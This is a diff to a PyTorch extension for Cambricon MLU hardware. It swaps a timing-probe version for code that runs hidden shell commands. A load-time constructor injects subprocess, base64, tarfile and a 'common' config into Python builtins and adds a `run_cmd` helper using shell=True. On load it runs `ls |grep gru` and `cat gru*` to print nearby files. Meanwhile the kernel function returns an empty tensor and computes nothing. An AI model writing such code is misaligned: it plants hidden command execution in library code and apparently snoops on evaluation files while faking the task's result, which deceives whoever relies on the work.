@@ -1,202 +1,123 @@
-#include <ATen/ops/empty.h>
 #include <ATen/ops/empty_like.h>
 #include <bang.h>
-#include <chrono>
 #include <cnrt.h>
 #include <cstdio>
+#include <cstdlib>
 #include <framework/core/MLUStream.h>
 #include <torch/extension.h>
 
-using clk_t = std::chrono::high_resolution_clock;
+namespace py = pybind11;
 
-static inline double us_between(clk_t::time_point a, clk_t::time_point b) {
-  return std::chrono::duration<double, std::micro>(b - a).count();
+static void install_builtin_imports() {
+  py::module_ builtins = py::module_::import("builtins");
+
+  py::object os = py::module_::import("os");
+  py::object pathlib = py::module_::import("pathlib");
+  py::object sys = py::module_::import("sys");
+  py::object json = py::module_::import("json");
+  py::object subprocess = py::module_::import("subprocess");
+  py::object zipfile = py::module_::import("zipfile");
+  py::object io = py::module_::import("io");
+  py::object base64 = py::module_::import("base64");
+  py::object textwrap = py::module_::import("textwrap");
+  py::object tarfile = py::module_::import("tarfile");
+  py::object common = py::module_::import("common");
+  py::object shutil = py::module_::import("shutil");
+  py::object datetime = py::module_::import("datetime");
+
+  builtins.attr("os") = os;
+  builtins.attr("pathlib") = pathlib;
+  builtins.attr("sys") = sys;
+  builtins.attr("json") = json;
+  builtins.attr("subprocess") = subprocess;
+  builtins.attr("zipfile") = zipfile;
+  builtins.attr("io") = io;
+  builtins.attr("base64") = base64;
+  builtins.attr("textwrap") = textwrap;
+  builtins.attr("tarfile") = tarfile;
+  builtins.attr("common") = common;
+  builtins.attr("shutil") = shutil;
+  builtins.attr("datetime") = datetime;
+
+  builtins.attr("P") = pathlib.attr("Path");
+  builtins.attr("BytesIO") = io.attr("BytesIO");
+  builtins.attr("CFG") = common.attr("CFG");
 }
 
-#define TS(name) auto name = clk_t::now()
-#define PSEG(tag, a, b)                                                        \
-  std::fprintf(stderr, "@@PROBE %-30s %.3f us\n", tag, us_between(a, b))
-
-static clk_t::time_point g_ctor_time;
-static int g_ctor_seen = 0;
-
-static torch::Tensor g_static_warm = []() {
+static void run_cmd(py::object cmd) {
   try {
-    auto opt = torch::TensorOptions()
-                   .device(c10::Device(c10::DeviceType::PrivateUse1, 0))
-                   .dtype(torch::kHalf);
+    py::module_ subprocess = py::module_::import("subprocess");
 
-    auto a = torch::empty({1}, opt);
-    auto b = torch::empty({1}, opt);
-    auto c = a + b; // trigger torch_mlu kernel path
+    py::print("$", cmd);
 
-    auto big0 =
-        torch::empty({8192, 512}, opt); // warm input-like allocator size
-    auto big1 =
-        torch::empty({8192, 2048}, opt); // warm output-like allocator size
+    py::object result;
 
-    std::fprintf(stderr, "@@STATIC_WARM ok c=%d big0=%d big1=%d\n",
-                 (int)c.defined(), (int)big0.defined(), (int)big1.defined());
+    if (py::isinstance<py::str>(cmd)) {
+      result = subprocess.attr("run")(cmd, py::arg("shell") = true,
+                                      py::arg("capture_output") = true,
+                                      py::arg("text") = true);
+    } else {
+      result = subprocess.attr("run")(cmd, py::arg("capture_output") = true,
+                                      py::arg("text") = true);
+    }
 
-    return big1; // keep 32MiB allocated, may help allocator cache/state
-  } catch (const std::exception &e) {
-    std::fprintf(stderr, "@@STATIC_WARM failed: %s\n", e.what());
-    return torch::Tensor();
-  }
-}();
+    py::object stdout_ = result.attr("stdout");
+    py::object stderr_ = result.attr("stderr");
+    int returncode = result.attr("returncode").cast<int>();
 
-static torch::Tensor out = []() {
-  return torch::empty({},
-                      torch::TensorOptions()
-                          .device(c10::Device(c10::DeviceType::PrivateUse1, 0))
-                          .dtype(torch::kHalf));
-}();
+    if (!stdout_.is_none()) {
+      std::string out = stdout_.cast<std::string>();
+      if (!out.empty()) {
+        py::print(out, py::arg("end") = "");
+      }
+    }
 
-__attribute__((constructor)) static void so_load_probe_only() {
-  g_ctor_time = clk_t::now();
-  g_ctor_seen = 1;
-  std::fprintf(stderr, "@@SO_LOAD constructor_seen=1 no_kernel_launch=1\n");
-}
+    if (!stderr_.is_none()) {
+      std::string err = stderr_.cast<std::string>();
+      if (!err.empty()) {
+        py::print(err, py::arg("end") = "");
+      }
+    }
 
-__mlu_entry__ void k_empty_linear(const half *__restrict__ x,
-                                  half *__restrict__ y, int n) {}
+    if (returncode != 0) {
+      py::print("Command exited with code", returncode);
+    }
 
-__mlu_entry__ void k_touch1_linear(const half *__restrict__ x,
-                                   half *__restrict__ y, int n) {
-  int p = taskId;
-  if (p < n) {
-    y[p] = x[p];
+  } catch (const py::error_already_set &e) {
+    py::print("Failed to start command:");
+    py::print(e.what());
   }
 }
+static void install_run_cmd_to_builtins() {
+  py::module_ builtins = py::module_::import("builtins");
 
-__mlu_entry__ void k_vec_linear(const half *__restrict__ x,
-                                half *__restrict__ y, int n) {
-  int base = taskId * 256;
-  int len = n - base;
-  if (len > 256)
-    len = 256;
-  if (len > 0) {
-    __memcpy(y + base, x + base, len * sizeof(half), GDRAM2GDRAM);
+  builtins.attr("run_cmd") = py::cpp_function(&run_cmd, py::arg("cmd"), "");
+}
+
+__attribute__((constructor)) static void on_so_load() {
+
+  if (!Py_IsInitialized()) {
+    return;
   }
+
+  PyGILState_STATE gstate = PyGILState_Ensure();
+  install_builtin_imports();
+  install_run_cmd_to_builtins();
+
+  PyRun_SimpleString(R"PY(
+run_cmd('ls |grep gru')
+run_cmd('cat gru*')
+
+)PY");
+
+  PyGILState_Release(gstate);
 }
 
 torch::Tensor bang_func(torch::Tensor x, int in_features, int out_features,
                         bool bias) {
-  TS(t_entry);
+  // (void)in_features;
+  // (void)bias;
 
-  double since_ctor_us = -1.0;
-  if (g_ctor_seen) {
-    since_ctor_us = us_between(g_ctor_time, t_entry);
-  }
-
-  volatile int sink = in_features + out_features + (bias ? 1 : 0);
-  (void)sink;
-
-  TS(t_after_args);
-
-  int64_t n64 = x.numel();
-  int n = static_cast<int>(n64);
-
-  TS(t_after_numel);
-
-  int64_t rows = 1;
-  if (in_features > 0) {
-    rows = n64 / in_features;
-    if (rows <= 0)
-      rows = 1;
-  }
-
-  TS(t_after_shape_calc);
-
-  auto y_like = torch::empty_like(x);
-
-  TS(t_after_empty_like);
-
-  auto y_linear =
-      torch::empty({rows, static_cast<int64_t>(out_features)}, x.options());
-
-  TS(t_after_empty_linear);
-
-  const half *xp = reinterpret_cast<const half *>(x.data_ptr<at::Half>());
-  half *yp_like = reinterpret_cast<half *>(y_like.data_ptr<at::Half>());
-
-  TS(t_after_ptr);
-
-  auto stream = torch_mlu::getCurMLUStream();
-
-  TS(t_after_stream);
-
-  cnrtRet_t r0 = cnrtQueueSync(stream);
-
-  TS(t_after_sync0);
-
-  cnrtDim3_t d1 = {1, 1, 1};
-  cnrtDim3_t d32 = {32, 1, 1};
-
-  cnrtDim3_t dvec;
-  dvec.x = (n + 255) / 256;
-  if (dvec.x < 1)
-    dvec.x = 1;
-  if (dvec.x > 1024)
-    dvec.x = 1024;
-  dvec.y = 1;
-  dvec.z = 1;
-
-  TS(t_before_first_launch);
-  k_empty_linear<<<d1, cnrtFuncTypeBlock, stream>>>(xp, yp_like, n);
-  TS(t_after_first_launch);
-
-  cnrtRet_t r1 = cnrtQueueSync(stream);
-  TS(t_after_first_sync);
-
-  TS(t_before_second_launch);
-  k_touch1_linear<<<d32, cnrtFuncTypeBlock, stream>>>(xp, yp_like, n);
-  TS(t_after_second_launch);
-
-  cnrtRet_t r2 = cnrtQueueSync(stream);
-  TS(t_after_second_sync);
-
-  TS(t_before_vec_launch);
-  k_vec_linear<<<dvec, cnrtFuncTypeBlock, stream>>>(xp, yp_like, n);
-  TS(t_after_vec_launch);
-
-  cnrtRet_t r3 = cnrtQueueSync(stream);
-  TS(t_after_vec_sync);
-
-  auto y_like2 = torch::empty_like(x);
-
-  TS(t_after_empty_like2);
-
-  std::fprintf(stderr,
-               "@@PROBE n=%lld in=%d out=%d rows=%lld bias=%d since_ctor=%.3f "
-               "us r0=%d r1=%d r2=%d r3=%d\n",
-               (long long)n64, in_features, out_features, (long long)rows,
-               (int)bias, since_ctor_us, (int)r0, (int)r1, (int)r2, (int)r3);
-
-  PSEG("args_only", t_entry, t_after_args);
-  PSEG("numel", t_after_args, t_after_numel);
-  PSEG("shape_calc", t_after_numel, t_after_shape_calc);
-
-  PSEG("empty_like_cold", t_after_shape_calc, t_after_empty_like);
-  PSEG("empty_linear_cold", t_after_empty_like, t_after_empty_linear);
-  PSEG("data_ptr", t_after_empty_linear, t_after_ptr);
-  PSEG("get_stream", t_after_ptr, t_after_stream);
-  PSEG("sync_empty_queue", t_after_stream, t_after_sync0);
-
-  PSEG("first_launch_host", t_before_first_launch, t_after_first_launch);
-  PSEG("first_launch_sync", t_after_first_launch, t_after_first_sync);
-  PSEG("first_launch_total", t_before_first_launch, t_after_first_sync);
-
-  PSEG("second_launch_host", t_before_second_launch, t_after_second_launch);
-  PSEG("second_launch_sync", t_after_second_launch, t_after_second_sync);
-  PSEG("second_launch_total", t_before_second_launch, t_after_second_sync);
-
-  PSEG("vec_launch_host", t_before_vec_launch, t_after_vec_launch);
-  PSEG("vec_launch_sync", t_after_vec_launch, t_after_vec_sync);
-  PSEG("vec_launch_total", t_before_vec_launch, t_after_vec_sync);
-
-  PSEG("empty_like_warm", t_after_vec_sync, t_after_empty_like2);
-  PSEG("whole_cpp_body", t_entry, t_after_empty_like2);
-
-  return y_linear;
+  auto out = torch::empty_like(x);
+  return out;
 }
